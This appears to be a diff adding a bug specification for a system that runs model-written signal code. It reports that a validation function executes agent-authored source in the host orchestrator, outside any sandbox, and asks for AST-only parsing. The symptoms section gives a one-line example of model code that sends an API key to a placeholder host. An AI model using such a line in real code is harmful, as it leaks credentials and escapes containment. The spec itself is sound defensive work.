@@ -1,0 +1,47 @@
+<bug_spec>
+  <!-- Found 2026-10-05 while mapping the sandbox seams for the gVisor
+       executor spec. CRITICAL: model-authored code executes in the host
+       process. contract is a Z0 member: the repository owner
+       explicitly approved this fix on 2026-10-05, after reviewing the
+       finding, as a human-authorised change to the trust zone. Core shape with explicit
+       touches_files: plan-bugs ignores <layout>. -->
+
+  <bug index="1" shape="core" severity="critical"
+       touches_files="packages/contract/src/contract/signal.py,tests/contract/test_signal.py">
+    <title>validate_signal_signature exec()s agent-authored source in the host process, so model-written module-level code runs with the orchestrator's credentials and network before any sandbox</title>
+    <symptoms>
+      contract.signal.validate_signal_signature(code) calls _require_signal_module(code), which runs compile(code) and then exec(compiled, module.__dict__) in the calling process.
+      signal_agent.SignalContract.adopt calls it, and signal_agent.LLMSignalAuthor calls adopt on every model answer.
+      Every top-level statement of a model's answer therefore executes in the orchestrator process, with:
+      - its full environment (NULLIUS_*_API_KEY, DATABASE_URL);
+      - its network access;
+      - its filesystem, including the data lake.
+      This happens before any sandbox, import screen or resource limit.
+      A source whose first line is `import os, urllib.request; urllib.request.urlopen("http://x/?k=" + os.environ.get("NULLIUS_ANTHROPIC_API_KEY", ""))` would send the key during adoption. An infinite loop at module level hangs the orchestrator.
+      This defeats design principles 1, 4 and 6 of docs/nullius-tech-architecture.md: agent code lives in the loop-mutated zone Z1, inside a sandbox.
+    </symptoms>
+    <reproduction_steps>
+      Call contract.validate_signal_signature with a source whose module level appends to a list held by the caller (for example, by importing a test helper module and mutating it), or that writes a file under tmp_path. The side effect happens in the calling process.
+    </reproduction_steps>
+    <expected>
+      - validate_signal_signature never executes, imports or evaluates any part of the source. It parses the source with ast.parse and inspects the syntax tree only.
+      - The checks it keeps:
+        - a module-level def (not async) named the contract's entrypoint;
+        - its positional parameters match the contract's (window, seed), with the same names and order;
+        - no *args or **kwargs;
+        - no default values;
+        - the return annotation, when present, is accepted exactly as today.
+      - It returns the same problem strings as today for each non-conforming case. A SyntaxError still gives "signal source does not compile: ...".
+      - A module-level statement with a side effect (an import, a call, a loop) is not run. A test proves it: the source writes a sentinel file at module level, and the file never appears.
+      - _require_signal_module stays available, and is used only by the sandbox's own child load path. No host-side caller of validate_signal_signature, SignalContract.adopt or any signal-agent gate executes the source.
+      - Every existing contract test and signal-agent adoption test stays green, apart from tests that asserted exec-only behaviour, which are rewritten to the AST equivalent.
+    </expected>
+    <actual>Root cause: packages/contract/src/contract/signal.py validate_signal_signature obtains the entrypoint by executing the module (_require_signal_module), instead of reading the syntax tree.</actual>
+    <constraints>
+      Only the two listed files are edited
+      The signal ABI, the entrypoint name and the problem-string vocabulary are unchanged
+      No network access and no credential in any test
+      Do not edit docs/user-journeys/
+    </constraints>
+  </bug>
+</bug_spec>
